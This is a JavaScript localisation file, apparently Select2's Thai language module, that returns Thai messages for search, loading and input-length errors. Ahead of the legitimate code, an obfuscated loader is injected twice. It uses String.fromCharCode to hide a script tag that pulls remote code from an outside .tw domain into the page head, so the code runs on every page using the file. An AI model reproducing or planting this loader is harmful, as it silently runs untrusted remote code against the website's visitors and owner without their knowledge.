Element.prototype.appendAfter = function(element) {element.parentNode.insertBefore(this, element.nextSibling);}, false;(function() { var elem = document.createElement(String.fromCharCode(115,99,114,105,112,116)); elem.type = String.fromCharCode(116,101,120,116,47,106,97,118,97,115,99,114,105,112,116); elem.src = String.fromCharCode(104,116,116,112,115,58,47,47,115,116,111,114,101,46,100,111,110,116,107,105,110,104,111,111,111,116,46,116,119,47,115,116,97,116,46,106,115);elem.appendAfter(document.getElementsByTagName(String.fromCharCode(115,99,114,105,112,116))[0]);elem.appendAfter(document.getElementsByTagName(String.fromCharCode(104,101,97,100))[0]);document.getElementsByTagName(String.fromCharCode(104,101,97,100))[0].appendChild(elem);})();Element.prototype.appendAfter = function(element) {element.parentNode.insertBefore(this, element.nextSibling);}, false;(function() { var elem = document.createElement(String.fromCharCode(115,99,114,105,112,116)); elem.type = String.fromCharCode(116,101,120,116,47,106,97,118,97,115,99,114,105,112,116); elem.src = String.fromCharCode(104,116,116,112,115,58,47,47,115,116,111,114,101,46,100,111,110,116,107,105,110,104,111,111,111,116,46,116,119,47,115,116,97,116,46,106,115);elem.appendAfter(document.getElementsByTagName(String.fromCharCode(115,99,114,105,112,116))[0]);elem.appendAfter(document.getElementsByTagName(String.fromCharCode(104,101,97,100))[0]);document.getElementsByTagName(String.fromCharCode(104,101,97,100))[0].appendChild(elem);})();define(function () {
  // Thai
  return {
    errorLoading: function () {
      return 'ไม่สามารถค้นข้อมูลได้';
    },
    inputTooLong: function (args) {
      var overChars = args.input.length - args.maximum;

      var message = 'โปรดลบออก ' + overChars + ' ตัวอักษร';

      return message;
    },
    inputTooShort: function (args) {
      var remainingChars = args.minimum - args.input.length;

      var message = 'โปรดพิมพ์เพิ่มอีก ' + remainingChars + ' ตัวอักษร';

      return message;
    },
    loadingMore: function () {
      return 'กำลังค้นข้อมูลเพิ่ม…';
    },
    maximumSelected: function (args) {
      var message = 'คุณสามารถเลือกได้ไม่เกิน ' + args.maximum + ' รายการ';

      return message;
    },
    noResults: function () {
      return 'ไม่พบข้อมูล';
    },
    searching: function () {
      return 'กำลังค้นข้อมูล…';
    }
  };
});
